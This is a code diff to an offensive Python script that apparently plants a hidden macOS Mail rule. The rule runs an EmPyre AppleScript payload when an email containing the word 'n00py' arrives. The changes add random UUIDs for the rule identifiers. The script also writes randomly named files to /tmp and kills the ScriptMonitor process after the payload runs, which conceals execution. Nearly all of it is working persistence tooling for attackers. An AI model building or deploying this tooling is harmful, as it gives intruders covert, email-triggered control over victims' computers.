@@ -9,7 +9,7 @@ ruleName = "Test"
 trigger = "n00py"
 
 #Paste the applescript here
-#NOTE: When copying the applescript from EmPyre make sure you escape the backslashes twice!
+#NOTE: When copying the applescript from EmPyre make sure you escape the backslashes twice!  Also remove the last double quote.
 payload =  '''
 '''
 #This makes the applescript kill itself after the python payload is executed
@@ -17,6 +17,12 @@ payload += 'kill `ps -ax | grep \\"ScriptMonitor\\" |grep -v \\"grep\\" |  cut -
 
 #Gets the users current home directory
 home =  os.getenv("HOME")
+#Create random unique IDs
+hex = '0123456789ABCDEF'
+def UUID():
+    return ''.join([choice(hex) for x in range(8)]) + "-" + ''.join([choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(12)])
+CriterionUniqueId  = UUID()
+RuleId  = UUID()
 #Creates random filenames
 SyncedRules = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
 RulesActiveState = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
@@ -37,7 +43,7 @@ plist = '''<?xml version="1.0" encoding="UTF-8"?>
 		<array>
 			<dict>
 				<key>CriterionUniqueId</key>
-				<string>254DAA18-F3D3-4255-A130-33AA94DC6686</string>
+				<string>'''+ CriterionUniqueId + '''</string>
 				<key>Expression</key>
 				<string>''' + trigger + '''</string>
 				<key>Header</key>
@@ -55,7 +61,7 @@ plist = '''<?xml version="1.0" encoding="UTF-8"?>
 		<key>NotifyUser</key>
 		<string>NO</string>
 		<key>RuleId</key>
-		<string>9C8F5248-7894-46B4-A081-37AAB2500086</string>
+		<string>'''+ RuleId + '''</string>
 		<key>RuleName</key>
 		<string>''' + ruleName + '''</string>
 		<key>SendNotification</key>
@@ -76,7 +82,7 @@ plist2 = '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-	<key>9C8F5248-7894-46B4-A081-37AAB2500086</key>
+	<key>'''+ RuleId + '''</key>
 	<true/>
 </dict>
 </plist>
